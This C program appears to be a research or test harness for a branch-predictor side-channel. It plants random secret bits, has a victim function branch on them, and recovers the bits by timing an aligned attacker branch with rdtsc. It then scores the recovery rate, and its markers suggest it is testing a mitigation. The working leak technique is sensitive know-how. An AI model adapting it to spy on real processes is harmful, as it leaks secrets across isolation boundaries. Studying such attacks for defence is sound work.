#include <unistd.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <time.h>
#include "../utils/branchutils.h"

#define SECRET_SIZE 10000

int victim(FILE *fp){
    uint64_t start, d;
    int b = fgetc(fp) - '0';
    asm volatile("SAFE1_start:"); //SAFE start
    if (rand() % 2){asm volatile("nop;":::"rax","rdx");} /*SAFE_BRANCH*/
    if (rand() % 2){asm volatile("nop;":::"rax","rdx");} /*SAFE_BRANCH*/
    asm volatile(
        "cmp $0x1, %%rcx;"
        ".p2align 15, 0x90;"
        "mfence;"
        "rdtsc;"
        "mfence;"
        "je label1;" /*SAFE BRANCH*/
        "label1:"
        "nop;"
        :"=a"(start), "=d"(d):"c"(b));
    asm volatile("SAFE1_end:"); //SAFE end
    start = (d << 32) | start;
    int end = rdtsc();
    return (int)(end - start);
}

int attacker_branch(unsigned int value){ // (1:Taken, 0:Not-taken)
    uint64_t start, end, d;
    asm volatile(
        "cmp $0x1, %%rcx;"
        ".p2align 15, 0x90;"
        "mfence;"
        "rdtsc;"
        "mfence;"
        "je label0;"
        "label0:"
        "nop;"
        :"=a"(start), "=d"(d):"c"(value));
    start = (d << 32) | start;
    end = rdtsc();
    return (int)(end - start);
}

int leak_1bit(FILE *fp){
    uint64_t start = 0, end = 0;
    /* Step 1 : Initialize PHT */
    randomize_pht(); //WT

    /* Step 2 : Trigger Victim Branch Execution */
    int tmp = victim(fp);

    /* Step 3 : Probe PHT State Change */
    int latency = attacker_branch(1); //Taken

    printf("%d %d\n", tmp, latency);
    if (latency < BRANCH_MISS){
        return 1;
    }
    else return 0;
}


int initialize_secret(){
    srand(time(NULL));
    FILE *fp = fopen("secret_bits.txt", "w");
    for (int i=0;i<SECRET_SIZE;i++){
        fputc(rand()%2 + '0', fp);
    }
    fclose(fp);
    return 0;
}

int main(int argc, const char * * argv){
    BRANCH_MISS = detect_branch_prediction_threshold();
    printf("BRANCH MISS THRESHOLD: %d\n", BRANCH_MISS);
    
    srand((unsigned int)time(NULL));

    initialize_secret();
    mfence();
    FILE *fp = fopen("secret_bits.txt", "r");
    FILE *fp2 = fopen("secret_recovered.txt", "w");

    for (int i=0;i<SECRET_SIZE;i++){
        int s = leak_1bit(fp);
        fputc(s + '0', fp2);    
    }

    fclose(fp);
    fclose(fp2);

    fp = fopen("secret_bits.txt", "r");
    fp2 = fopen("secret_recovered.txt", "r");
    
    int b1, b2, same=0;
    for (int i=0;i<SECRET_SIZE;i++){
        b1 = fgetc(fp) - '0';
        b2 = fgetc(fp2) - '0';
        if (b1 == b2) same++;
    }
    printf("score: %d/%d\n", same, SECRET_SIZE);
    
    return 0;
}
